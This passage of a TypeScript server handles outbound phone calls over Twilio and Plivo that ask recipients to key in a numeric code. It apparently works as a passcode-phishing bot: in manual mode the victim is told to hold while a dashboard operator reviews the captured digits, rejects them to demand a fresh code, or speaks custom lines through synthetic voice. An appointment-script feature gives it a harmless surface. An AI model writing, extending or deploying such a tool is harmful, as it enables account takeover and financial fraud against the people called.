          title: `Invalid Code Entered (Attempt ${session.attempts}/${maxAttempts}): [${rawDigits}]`,
          description: `Entered code "${rawDigits}" does not match expected "${session.expectedCode}". Playing retry voice prompt.`,
          data: { entered: rawDigits, expected: session.expectedCode, attempt: session.attempts, maxAttempts },
        });

        twiml.say({ voice: session.voice as any }, session.invalidMessage || 'That code is incorrect. Please try again.');

        const gatherRetry = twiml.gather({
          action: gatherActionUrl,
          method: 'POST',
          input: ['dtmf'],
          numDigits: session.numDigits || 6,
          finishOnKey: '#',
          timeout: 15,
        });
        gatherRetry.say({ voice: session.voice as any }, `Please enter your ${session.numDigits}-digit code now, followed by the pound sign.`);

        twiml.say({ voice: session.voice as any }, 'We did not receive your code. Goodbye.');
        twiml.hangup();

        session.status = 'collecting-input';
        res.type('text/xml');
        return res.send(twiml.toString());
      } else {
        session.status = 'failed';
        session.codeStatus = 'max_exceeded';
        session.completedAt = new Date().toISOString();

        addSessionEvent(session, {
          type: 'error',
          title: 'Verification Failed: Maximum Attempts Exceeded',
          description: `Recipient entered incorrect code ${session.attempts} times. Terminating call.`,
          data: { attempts: session.attempts, maxAttempts },
        });

        twiml.say({ voice: session.voice as any }, 'Maximum incorrect attempts exceeded. Goodbye.');
        twiml.hangup();

        res.type('text/xml');
        return res.send(twiml.toString());
      }
    }

    // AUTO VALID
    session.capturedDigits = rawDigits;
    session.codeStatus = 'valid';
    session.status = 'completed';
    session.completedAt = new Date().toISOString();

    addSessionEvent(session, {
      type: 'dtmf',
      title: `Code Verified Valid: [${rawDigits}]`,
      description: `Recipient entered valid ${rawDigits.length}-digit code [${rawDigits}]. Playing confirmation message.`,
      data: { digits: rawDigits, expected: session.expectedCode },
    });

    const confMsg = session.successMessage || 'Thank you. Your code has been verified successfully. Goodbye.';
    twiml.say({ voice: session.voice as any }, confMsg);
    twiml.hangup();

    addSessionEvent(session, {
      type: 'playback',
      title: 'Confirmation Voice Prompt Played',
      description: `Playing synthetic voice (${session.voice}): "${confMsg}"`,
      data: { message: confMsg },
    });
  } else {
    twiml.say({ voice: 'Polly.Joanna' }, 'Thank you. Goodbye.');
    twiml.hangup();
  }

  res.type('text/xml');
  res.send(twiml.toString());
});

// 3. XML Wait Operator Loop
app.all(XML_WAIT_ROUTES, (req: Request, res: Response) => {
  const session = findSession(req);
  const twiml = new twilio.twiml.VoiceResponse();
  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);

  const matchedWaitBase = XML_WAIT_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/wait-operator';
  const matchedGatherBase = XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';

  if (!session) {
    twiml.say({ voice: 'Polly.Joanna' }, 'Session has ended. Goodbye.');
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // 1. Spoken cue from operator
  if (session.activeCue) {
    const cueMsg = session.activeCue.text;
    session.activeCue = undefined;
    persistSessionsToDisk();
    twiml.say({ voice: session.voice as any }, cueMsg);
    twiml.pause({ length: 2 });
    twiml.redirect({ method: 'POST' }, `${appBaseUrl}${matchedWaitBase}?callId=${encodeURIComponent(session.id)}`);
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // 2. Approved by operator
  if (session.operatorDecision === 'approved') {
    session.capturedDigits = session.pendingDigits || session.capturedDigits;
    session.pendingDigits = undefined;
    session.codeStatus = 'valid';
    session.status = 'completed';
    session.completedAt = new Date().toISOString();

    const confMsg = session.successMessage || 'Thank you. Your code has been verified successfully. Goodbye.';
    twiml.say({ voice: session.voice as any }, confMsg);
    twiml.hangup();

    addSessionEvent(session, {
      type: 'playback',
      title: 'Confirmation Message Played & Call Completed',
      description: `Playing synthetic voice: "${confMsg}"`,
    });

    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // 3. Rejected by operator
  if (session.operatorDecision === 'rejected') {
    session.operatorDecision = undefined;
    session.status = 'collecting-input';
    persistSessionsToDisk();

    const gatherActionUrl = `${appBaseUrl}${matchedGatherBase}?callId=${encodeURIComponent(session.id)}`;
    const retryMsg = session.invalidMessage || 'That code is incorrect. Please re-enter your code now, followed by the pound sign.';
    twiml.say({ voice: session.voice as any }, retryMsg);

    const gatherRetry = twiml.gather({
      action: gatherActionUrl,
      method: 'POST',
      input: ['dtmf'],
      numDigits: session.numDigits || 6,
      finishOnKey: '#',
      timeout: 25,
    });
    gatherRetry.say({ voice: session.voice as any }, `Please enter your ${session.numDigits}-digit code now, followed by the pound sign.`);

    twiml.say({ voice: session.voice as any }, 'We did not receive your code. Goodbye.');
    twiml.hangup();

    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // 4. Fast 2-second hold poll loop (speaks comfort reminder once every ~12s)
  session.waitPollCount = (session.waitPollCount || 0) + 1;
  persistSessionsToDisk();
  if (session.waitPollCount % 6 === 0) {
    twiml.say({ voice: session.voice as any }, 'Thank you for your patience. Please continue to hold.');
  }
  twiml.pause({ length: 2 });
  twiml.redirect({ method: 'POST' }, `${appBaseUrl}${matchedWaitBase}?callId=${encodeURIComponent(session.id)}`);

  res.type('text/xml');
  res.send(twiml.toString());
});

// 4. XML Status Callback
app.all(XML_STATUS_ROUTES, (req: Request, res: Response) => {
  const session = findSession(req);

  if (session) {
    const callStatus = req.body.CallStatus || req.body.call_status;
    const duration = req.body.CallDuration ? parseInt(req.body.CallDuration, 10) : undefined;

    if (duration !== undefined) session.duration = duration;

    if (callStatus === 'initiated' && session.status === 'queued') {
      session.status = 'initiating';
      addSessionEvent(session, {
        type: 'call-state',
        title: 'Carrier Status: Initiated',
        description: 'Outbound call leg initiated on PSTN gateway.',
      });
    } else if (callStatus === 'ringing' && ['queued', 'initiating'].includes(session.status)) {
      session.status = 'ringing';
      addSessionEvent(session, {
        type: 'call-state',
        title: 'Carrier Status: Ringing',
        description: 'Recipient device is actively alerting.',
      });
    } else if (callStatus === 'in-progress' && ['queued', 'initiating', 'ringing'].includes(session.status)) {
      session.status = 'in-progress';
      persistSessionsToDisk();
      broadcastEvent(session.id, 'session-update', session);
    } else if (callStatus === 'completed') {
      session.status = 'completed';
      session.pendingDigits = undefined;
      session.activeCue = undefined;
      session.completedAt = new Date().toISOString();
      addSessionEvent(session, {
        type: 'call-state',
        title: 'Call Completed',
        description: `Session finished. Duration: ${duration || 0} seconds.`,
        data: { duration },
      });
    } else if (['busy', 'no-answer', 'failed', 'canceled'].includes(callStatus)) {
      session.status = (callStatus === 'canceled' ? 'completed' : callStatus) as any;
      session.pendingDigits = undefined;
      session.activeCue = undefined;
      session.completedAt = new Date().toISOString();
      addSessionEvent(session, {
        type: 'call-state',
        title: `Call Ended (${callStatus})`,
        description: `Carrier returned status: ${callStatus}.`,
      });
    }
  }

  res.sendStatus(200);
});

// -------------------------------------------------------------
// PLIVO XML WEBHOOKS (Plivo Voice API)
// -------------------------------------------------------------
// 1. Plivo Outbound / Answer
app.all(['/api/plivo/outbound', '/api/plivo/answer'], (req: Request, res: Response) => {
  const session = findSession(req);
  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);

  if (!session) {
    res.type('text/xml');
    return res.send(`<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>Welcome to VoiceDrop Interactive. Session could not be found.</Speak>
  <Hangup />
</Response>`);
  }

  session.status = 'in-progress';
  addSessionEvent(session, {
    type: 'call-state',
    title: 'Recipient Answered Call (Plivo)',
    description: `Call connected with ${session.to}. Playing immediate pickup greeting.`,
  });

  addSessionEvent(session, {
    type: 'playback',
    title: 'Immediate Pickup Greeting Played',
    description: `Playing synthetic voice: "${session.introGreeting}"`,
    data: { greeting: session.introGreeting },
  });

  session.status = 'collecting-input';
  addSessionEvent(session, {
    type: 'gather',
    title: `Listening for ${session.numDigits}-Digit Code (Plivo)`,
    description: `Plivo GetDigits active. Expecting ${session.numDigits} digits.`,
  });

  const gatherUrl = `${appBaseUrl}/api/plivo/gather?callId=${encodeURIComponent(session.id)}`;
  const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>${escapeXml(session.introGreeting)}</Speak>
  <GetDigits action="${escapeXml(gatherUrl)}" method="POST" numDigits="${session.numDigits || 6}" finishOnKey="#" timeout="15">
    <Speak>${escapeXml(session.script)}</Speak>
  </GetDigits>
  <Speak>We did not receive your code. Thank you for your time. Goodbye.</Speak>
  <Hangup />
</Response>`;

  res.type('text/xml');
  res.send(xml);
});

// 2. Plivo Gather Callback
app.all('/api/plivo/gather', (req: Request, res: Response) => {
  const session = findSession(req);
  const digits = req.body.Digits || req.query.Digits;
  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);

  if (session && digits) {
    const rawDigits = String(digits).trim();

    // 1. MANUAL OPERATOR REVIEW MODE
    if (session.verificationMode === 'manual') {
      session.pendingDigits = rawDigits;
      session.codeStatus = 'awaiting_operator';
      session.status = 'awaiting-operator';
      session.operatorDecision = 'pending';

      addSessionEvent(session, {
        type: 'dtmf',
        title: `Code Received: [${rawDigits}] — Awaiting Operator Decision`,
        description: `Caller entered ${rawDigits.length}-digit code. Playing hold message while dashboard operator reviews.`,
        data: { digits: rawDigits, verificationMode: 'manual' },
      });

      const holdPrompt = session.holdMessage || 'Kindly hold while your information is being processed.';
      const waitUrl = `${appBaseUrl}/api/plivo/wait-operator?callId=${encodeURIComponent(session.id)}`;
      const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>${escapeXml(holdPrompt)}</Speak>
  <Wait length="4" />
  <Redirect method="POST">${escapeXml(waitUrl)}</Redirect>
</Response>`;
      res.type('text/xml');
      return res.send(xml);
    }

    // 2. AUTO MATCH MODE
    const isValid = !session.expectedCode || rawDigits === session.expectedCode.trim();
    if (!isValid) {
      session.attempts = (session.attempts || 0) + 1;
      session.lastInvalidDigits = rawDigits;
      session.codeStatus = 'invalid';
      const maxAttempts = session.maxAttempts || 3;

      if (session.attempts < maxAttempts) {
        addSessionEvent(session, {
          type: 'error',
          title: `Invalid Code Entered (Attempt ${session.attempts}/${maxAttempts}): [${rawDigits}]`,
          description: `Entered code "${rawDigits}" does not match expected "${session.expectedCode}". Prompting retry.`,
          data: { entered: rawDigits, expected: session.expectedCode, attempt: session.attempts, maxAttempts },
        });

        const gatherRetryUrl = `${appBaseUrl}/api/plivo/gather?callId=${encodeURIComponent(session.id)}`;
        const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>${escapeXml(session.invalidMessage || 'That code is incorrect. Please try again.')}</Speak>
  <GetDigits action="${escapeXml(gatherRetryUrl)}" method="POST" numDigits="${session.numDigits || 6}" finishOnKey="#" timeout="15">
    <Speak>Please enter your ${session.numDigits}-digit code now, followed by the pound sign.</Speak>
  </GetDigits>
  <Speak>We did not receive your code. Goodbye.</Speak>
  <Hangup />
</Response>`;
        session.status = 'collecting-input';
        res.type('text/xml');
        return res.send(xml);
      } else {
        session.status = 'failed';
        session.codeStatus = 'max_exceeded';
        session.completedAt = new Date().toISOString();

        addSessionEvent(session, {
          type: 'error',
          title: 'Verification Failed: Maximum Attempts Exceeded',
          description: `Recipient entered incorrect code ${session.attempts} times. Terminating call.`,
        });

        const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>Maximum incorrect attempts exceeded. Goodbye.</Speak>
  <Hangup />
</Response>`;
        res.type('text/xml');
        return res.send(xml);
      }
    }

    // AUTO VALID
    session.capturedDigits = rawDigits;
    session.codeStatus = 'valid';
    session.status = 'completed';
    session.completedAt = new Date().toISOString();

    addSessionEvent(session, {
      type: 'dtmf',
      title: `Code Verified Valid: [${rawDigits}]`,
      description: `Recipient entered valid code [${rawDigits}]. Playing confirmation message.`,
    });

    const confMsg = session.successMessage || 'Thank you. Your code has been verified successfully. Goodbye.';
    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>${escapeXml(confMsg)}</Speak>
  <Hangup />
</Response>`;
    res.type('text/xml');
    return res.send(xml);
  }

  const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>Thank you. Goodbye.</Speak>
  <Hangup />
</Response>`;
  res.type('text/xml');
  res.send(xml);
});

// 3. Plivo Wait Operator Loop
app.all('/api/plivo/wait-operator', (req: Request, res: Response) => {
  const session = findSession(req);
  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);

  if (!session) {
    res.type('text/xml');
    return res.send(`<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>Session has ended. Goodbye.</Speak>
  <Hangup />
</Response>`);
  }

  // 1. Spoken cue from operator
  if (session.activeCue) {
    const cueMsg = session.activeCue.text;
    session.activeCue = undefined;
    const waitUrl = `${appBaseUrl}/api/plivo/wait-operator?callId=${encodeURIComponent(session.id)}`;
    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>${escapeXml(cueMsg)}</Speak>
  <Wait length="3" />
  <Redirect method="POST">${escapeXml(waitUrl)}</Redirect>
</Response>`;
    res.type('text/xml');
    return res.send(xml);
  }

  // 2. Approved by operator
  if (session.operatorDecision === 'approved') {
    session.capturedDigits = session.pendingDigits || session.capturedDigits;
    session.pendingDigits = undefined;
    session.codeStatus = 'valid';
    session.status = 'completed';
    session.completedAt = new Date().toISOString();

    const confMsg = session.successMessage || 'Thank you. Your code has been verified successfully. Goodbye.';
    addSessionEvent(session, {
      type: 'playback',
      title: 'Confirmation Message Played & Call Completed',
      description: `Playing synthetic voice: "${confMsg}"`,
    });

    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>${escapeXml(confMsg)}</Speak>
  <Hangup />
</Response>`;
    res.type('text/xml');
    return res.send(xml);
  }

  // 3. Rejected by operator
  if (session.operatorDecision === 'rejected') {
    session.operatorDecision = undefined;
    session.status = 'collecting-input';

    const gatherUrl = `${appBaseUrl}/api/plivo/gather?callId=${encodeURIComponent(session.id)}`;
    const retryMsg = session.invalidMessage || 'That code is incorrect. Please re-enter your code now, followed by the pound sign.';
    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>${escapeXml(retryMsg)}</Speak>
  <GetDigits action="${escapeXml(gatherUrl)}" method="POST" numDigits="${session.numDigits || 6}" finishOnKey="#" timeout="15">
    <Speak>Please enter your ${session.numDigits}-digit code now, followed by the pound sign.</Speak>
  </GetDigits>
  <Speak>We did not receive your code. Goodbye.</Speak>
  <Hangup />
</Response>`;
    res.type('text/xml');
    return res.send(xml);
  }

  // 4. Fast 2-second Plivo hold poll loop
  session.waitPollCount = (session.waitPollCount || 0) + 1;
  persistSessionsToDisk();
  const waitUrl = `${appBaseUrl}/api/plivo/wait-operator?callId=${encodeURIComponent(session.id)}`;
  const comfortLine =
    session.waitPollCount % 6 === 0
      ? '  <Speak>Thank you for your patience. Please continue to hold.</Speak>\n'
      : '';
  const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
${comfortLine}  <Wait length="2" />
  <Redirect method="POST">${escapeXml(waitUrl)}</Redirect>
</Response>`;
  res.type('text/xml');
  res.send(xml);
});

// 4. Plivo Status Callback
app.all('/api/plivo/status', (req: Request, res: Response) => {
  const session = findSession(req);
  if (session) {
    const callStatus = req.body.CallStatus || req.body.Status;
    const duration = req.body.Duration ? parseInt(req.body.Duration, 10) : undefined;
    if (duration !== undefined) session.duration = duration;

    if (callStatus === 'completed' || callStatus === 'hangup') {
      session.status = 'completed';
      session.completedAt = new Date().toISOString();
      addSessionEvent(session, {
        type: 'call-state',
        title: 'Call Completed (Plivo)',
        description: `Session finished. Duration: ${duration || 0} seconds.`,
      });
    }
  }
  res.sendStatus(200);
});


// Operator Action Endpoint - Direct manual control of call flow and audio prompts
app.post('/api/call/operator-action', async (req: Request, res: Response) => {
  const { callId, action, customMessage, customTwilio, carriersConfig = {} } = req.body;
  const session = getSessionById(callId);

  if (!session) {
    return res.status(404).json({ error: 'Call session not found' });
  }

  const isCueAction = ['hold', 'incorrect_prompt', 'custom_cue'].includes(action);

  switch (action) {
    case 'approve':
      session.operatorDecision = 'approved';
      session.capturedDigits = session.pendingDigits || session.capturedDigits;
      session.pendingDigits = undefined;
      session.activeCue = undefined;
      session.codeStatus = 'valid';
      if (session.isSimulated) {
        session.status = 'completed';
        session.completedAt = new Date().toISOString();
      }

      addSessionEvent(session, {
        type: 'dtmf',
        title: `Operator Approved Code: [${session.capturedDigits}]`,
        description: `Operator manually approved the code. Playing confirmation message to recipient.`,
        data: { digits: session.capturedDigits, decision: 'approved' },
      });
      break;

    case 'reject':
      session.operatorDecision = 'rejected';
      session.attempts = (session.attempts || 0) + 1;
      session.lastInvalidDigits = session.pendingDigits;
      session.pendingDigits = undefined;
      session.codeStatus = 'invalid';
      session.status = 'collecting-input';

      addSessionEvent(session, {
        type: 'error',
        title: `Operator Rejected Code (Attempt ${session.attempts}): [${session.lastInvalidDigits}]`,
        description: `Operator marked code as incorrect. Playing retry voice prompt to caller.`,
        data: { rejectedDigits: session.lastInvalidDigits, attempts: session.attempts },
      });
      break;

    case 'hold': {
      const holdText = customMessage || session.holdMessage || 'Kindly hold while your information is being processed.';
      session.activeCue = { text: holdText, timestamp: new Date().toISOString() };
      addSessionEvent(session, {
        type: 'playback',
        title: 'Operator Triggered: "Kindly Hold / Please Wait"',
        description: `Prompting recipient: "${holdText}"`,
        data: { cue: holdText },
      });
      break;
    }

    case 'incorrect_prompt': {
      const incorrectText = customMessage || session.invalidMessage || 'The code entered is incorrect. Please try again.';
      session.activeCue = { text: incorrectText, timestamp: new Date().toISOString() };
      addSessionEvent(session, {
        type: 'playback',
        title: 'Operator Triggered: "Code Incorrect"',
        description: `Prompting recipient: "${incorrectText}"`,
        data: { cue: incorrectText },
      });
      break;
    }

    case 'custom_cue':
      if (customMessage) {
        session.activeCue = { text: customMessage.trim(), timestamp: new Date().toISOString() };
        addSessionEvent(session, {
          type: 'playback',
          title: `Operator Spoke to Recipient: "${customMessage.trim()}"`,
          description: `Synthetic voice playing custom message to caller.`,
          data: { cue: customMessage.trim() },
        });
      }
      break;

    default:
      return res.status(400).json({ error: `Unknown operator action: ${action}` });
  }

  // If this is a live Twilio call and the caller is currently in <Gather> (not yet in wait-operator loop),
  // redirect the live call leg to /api/twiml/cue-gather so they hear the operator cue immediately and resume <Gather>!
  if (
    !session.isSimulated &&
    isCueAction &&
    session.activeCue &&
    ['in-progress', 'collecting-input'].includes(session.status)
  ) {
    const providerSid = session.providerCallSid || session.id;
    const carrier = session.carrier || 'twilio';
    const appBaseUrl = getPublicBaseUrl(req, session.publicBaseUrl);

    if (carrier === 'twilio' && providerSid.startsWith('CA')) {
      try {
        const accountSid = carriersConfig.twilio?.accountSid || customTwilio?.accountSid || process.env.TWILIO_ACCOUNT_SID;
        const authToken = carriersConfig.twilio?.authToken || customTwilio?.authToken || process.env.TWILIO_AUTH_TOKEN;
        if (accountSid && authToken) {
          const client = twilio(accountSid, authToken);
          await client.calls(providerSid).update({
            url: `${appBaseUrl}/api/twiml/cue-gather?callId=${encodeURIComponent(session.id)}`,
            method: 'POST',
          });
        }
      } catch (err) {
        console.error('Error redirecting live Twilio call for cue:', err);
      }
    }
  }

  res.json({ success: true, session });
});

// Simulator Action Webhook - Used by the interactive phone mockup in the browser
app.post('/api/call/simulate-event', (req: Request, res: Response) => {
  const { callId, action, digits } = req.body;
  const session = getSessionById(callId);

  if (!session) {
    return res.status(404).json({ error: 'Call session not found' });
  }

  switch (action) {
    case 'answer':
      session.status = 'in-progress';
      addSessionEvent(session, {
        type: 'call-state',
        title: 'Recipient Answered Call',
        description: `Call connected with ${session.to}. Playing immediate pickup greeting.`,
      });

      // 1. Play immediate pickup greeting
      addSessionEvent(session, {
        type: 'playback',
        title: 'Immediate Pickup Greeting Played',
        description: `Playing synthetic voice: "${session.introGreeting}"`,
        data: { greeting: session.introGreeting, voice: session.voice },
      });

      session.status = 'collecting-input';
      addSessionEvent(session, {
        type: 'gather',
        title: `Listening for ${session.numDigits}-Digit Code`,
        description: `Prompting: "${session.script}" (${session.verificationMode === 'manual' ? 'Manual Operator Decision' : 'Auto Match'})`,
      });
      break;

    case 'dtmf':
      if (digits) {
        const rawDigits = String(digits).trim();

        // 1. MANUAL OPERATOR CONTROL MODE
        if (session.verificationMode === 'manual') {
          session.pendingDigits = rawDigits;
          session.codeStatus = 'awaiting_operator';
          session.status = 'awaiting-operator';
          session.operatorDecision = 'pending';

          addSessionEvent(session, {
            type: 'dtmf',
            title: `Code Received: [${rawDigits}] — Awaiting Operator Decision`,
            description: `Caller entered ${rawDigits.length}-digit code. Caller put on hold while operator reviews in web console.`,
            data: { digits: rawDigits, verificationMode: 'manual' },
          });

          return res.json({
            success: true,
            session,
            codeStatus: 'awaiting_operator',
            pendingDigits: rawDigits,
            message: session.holdMessage || 'Kindly hold while your information is being processed.',
          });
        }

        // 2. AUTO MATCH MODE
        const isValid = !session.expectedCode || rawDigits === session.expectedCode.trim();

        if (!isValid) {
          session.attempts = (session.attempts || 0) + 1;
          session.lastInvalidDigits = rawDigits;
          session.codeStatus = 'invalid';

          const maxAttempts = session.maxAttempts || 3;

          if (session.attempts < maxAttempts) {
            addSessionEvent(session, {
              type: 'error',
              title: `Invalid Code Entered (Attempt ${session.attempts}/${maxAttempts}): [${rawDigits}]`,
              description: `Entered code "${rawDigits}" does not match expected "${session.expectedCode}". Prompting recipient to try again.`,
              data: { entered: rawDigits, expected: session.expectedCode, attempt: session.attempts, maxAttempts },
            });

            return res.json({
              success: true,
              session,
              codeStatus: 'invalid',
              attempts: session.attempts,
              maxAttempts,
              message: session.invalidMessage || 'That code is incorrect. Please re-enter your code now, followed by the pound sign.',
            });
          } else {
            session.status = 'failed';
            session.codeStatus = 'max_exceeded';
            session.completedAt = new Date().toISOString();

            addSessionEvent(session, {
              type: 'error',
              title: 'Verification Failed: Maximum Attempts Exceeded',
              description: `Maximum incorrect code attempts (${session.attempts}) reached. Ending call.`,
            });

            return res.json({
              success: true,
              session,
              codeStatus: 'max_exceeded',
              message: 'Maximum attempts reached. Goodbye.',
            });
          }
        }

        // VALID CODE IN AUTO MODE
        session.capturedDigits = rawDigits;
        session.codeStatus = 'valid';

        addSessionEvent(session, {
          type: 'dtmf',
          title: `Code Verified Valid: [${rawDigits}]`,
          description: `Keypad capture: Correct ${rawDigits.length}-digit code [${rawDigits}] verified! Playing confirmation.`,
          data: { digits: rawDigits, expected: session.expectedCode },
        });

        setTimeout(() => {
          session.status = 'completed';
          session.completedAt = new Date().toISOString();
          addSessionEvent(session, {
            type: 'call-state',
            title: 'Call Interaction Finalized',
            description: `Confirmation message played: "${session.successMessage || 'Your code has been verified.'}". Call completed.`,
          });
        }, 1500);

        return res.json({
          success: true,
          session,
          codeStatus: 'valid',
          message: session.successMessage || 'Thank you. Your code has been verified successfully. Goodbye.',
        });
      }
      break;

    case 'decline':
    case 'hangup':
      session.status = action === 'decline' ? 'busy' : 'completed';
      session.pendingDigits = undefined;
      session.activeCue = undefined;
      session.completedAt = new Date().toISOString();
      addSessionEvent(session, {
        type: 'call-state',
        title: action === 'decline' ? 'Recipient Declined Call' : 'Call Terminated (Hangup)',
        description: `User pressed end call.`,
      });
      break;

    default:
      return res.status(400).json({ error: `Unknown simulator action: ${action}` });
  }

  res.json({ success: true, session });
});

// Hangup endpoint from dashboard
app.post('/api/call/hangup', async (req: Request, res: Response) => {
  const { callId, customTwilio, carriersConfig = {} } = req.body;
  const session = getSessionById(callId);

  if (!session) {
    return res.status(404).json({ error: 'Call session not found' });
  }

  session.status = 'completed';
  session.pendingDigits = undefined;
  session.activeCue = undefined;
  session.completedAt = new Date().toISOString();

  addSessionEvent(session, {
    type: 'call-state',
    title: 'Call Terminated by Dashboard Operator',
    description: 'Operator pressed End Call button in web console.',
  });

  // Terminate live PSTN call on active carrier
  if (!session.isSimulated) {
    try {
      const carrier = session.carrier || 'twilio';
      const providerSid = session.providerCallSid || session.id;
      if (carrier === 'twilio') {
        const accountSid = carriersConfig.twilio?.accountSid || customTwilio?.accountSid || process.env.TWILIO_ACCOUNT_SID;
        const authToken = carriersConfig.twilio?.authToken || customTwilio?.authToken || process.env.TWILIO_AUTH_TOKEN;
        if (accountSid && authToken && providerSid.startsWith('CA')) {
          const client = twilio(accountSid, authToken);
          await client.calls(providerSid).update({ status: 'completed' });
        }
      } else if (carrier === 'plivo') {
        const plivoAuthId = carriersConfig.plivo?.authId || process.env.PLIVO_AUTH_ID;
        const plivoAuthToken = carriersConfig.plivo?.authToken || process.env.PLIVO_AUTH_TOKEN;
        if (plivoAuthId && plivoAuthToken && !providerSid.startsWith('call_')) {
          await fetch(`https://api.plivo.com/v1/Account/${plivoAuthId}/Call/${encodeURIComponent(providerSid)}/`, {
            method: 'DELETE',
            headers: {
              Authorization: `Basic ${Buffer.from(`${plivoAuthId}:${plivoAuthToken}`).toString('base64')}`,
            },
          });
        }
      } else if (carrier === 'telnyx') {
        const telnyxApiKey = carriersConfig.telnyx?.apiKey || process.env.TELNYX_API_KEY;
        if (telnyxApiKey && !providerSid.startsWith('call_')) {
          await fetch(`https://api.telnyx.com/v2/calls/${encodeURIComponent(providerSid)}/actions/hangup`, {
            method: 'POST',
            headers: {
              Authorization: `Bearer ${telnyxApiKey}`,
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({}),
          });
        }
      } else if (carrier === 'signalwire') {
        const spaceUrl = carriersConfig.signalwire?.spaceUrl || process.env.SIGNALWIRE_SPACE_URL;
        const projectId = carriersConfig.signalwire?.projectId || process.env.SIGNALWIRE_PROJECT_ID;
        const apiToken = carriersConfig.signalwire?.apiToken || process.env.SIGNALWIRE_API_TOKEN;
        if (spaceUrl && projectId && apiToken && !providerSid.startsWith('call_')) {
          const cleanSpace = spaceUrl.replace(/^https?:\/\//, '').replace(/\/$/, '');
          await fetch(`https://${cleanSpace}/api/laml/2010-04-01/Accounts/${projectId}/Calls/${encodeURIComponent(providerSid)}.json`, {
            method: 'POST',
            headers: {
              Authorization: `Basic ${Buffer.from(`${projectId}:${apiToken}`).toString('base64')}`,
              'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({ Status: 'completed' }).toString(),
          });
        }
      }
    } catch (err) {
      console.error('Error hanging up carrier call:', err);
    }
  }

  res.json({ success: true, session });
});

// Optional Gemini API endpoint for AI script optimization
app.post('/api/ai/enhance-script', async (req: Request, res: Response) => {
  try {
    const { prompt, useCase = 'appointment' } = req.body;
    const rawApiKey = (process.env.GEMINI_API_KEY || '').trim();
    const apiKey = rawApiKey && rawApiKey !== 'MY_GEMINI_API_KEY' ? rawApiKey : '';

    if (!apiKey) {
      return res.status(400).json({
        error: 'Gemini API key is not configured in environment. You can enter scripts manually.',
      });
    }

    const ai = new GoogleGenAI({ apiKey });
    const response = await ai.models.generateContent({
      model: 'gemini-2.5-flash',
      contents: `You are an expert telephony UX scriptwriter. Create an outbound interactive phone call script with clear DTMF options.
User Request / Context: "${prompt}"
Use case category: "${useCase}".

Return ONLY valid JSON with this exact schema:
{
  "script": "The spoken voice prompt that will be read aloud to the recipient by text-to-speech. Must end with clear instructions like: Please press 1 to confirm, press 2 to reschedule, or press 9 to speak with an agent.",
  "keypadActions": {
    "1": "Short label for 1 (e.g. Confirmed)",
    "2": "Short label for 2 (e.g. Reschedule)",
    "9": "Short label for 9 (e.g. Support)"
  },
  "recommendedVoice": "Polly.Joanna" or "Polly.Matthew"
}`,
    });

    const text = response.text || '';
    const cleanJson = text.replace(/```json\n?|\n?```/g, '').trim();
    const parsed = JSON.parse(cleanJson);
    res.json(parsed);
  } catch (err: any) {
    console.error('AI script enhancement error:', err);
    res.status(500).json({ error: err.message || 'Failed to generate AI script' });
  }
});

// Mount Vite or static production files
async function startServer() {
  if (!isProd) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(path.resolve(__dirname, 'dist')));
    app.get('*', (req: Request, res: Response) => {
      res.sendFile(path.resolve(__dirname, 'dist', 'index.html'));
    });
  }

  app.listen(Number(PORT), '0.0.0.0', () => {
    console.log(`VoiceDrop Interactive server running on port ${PORT}`);
  });
}

startServer();
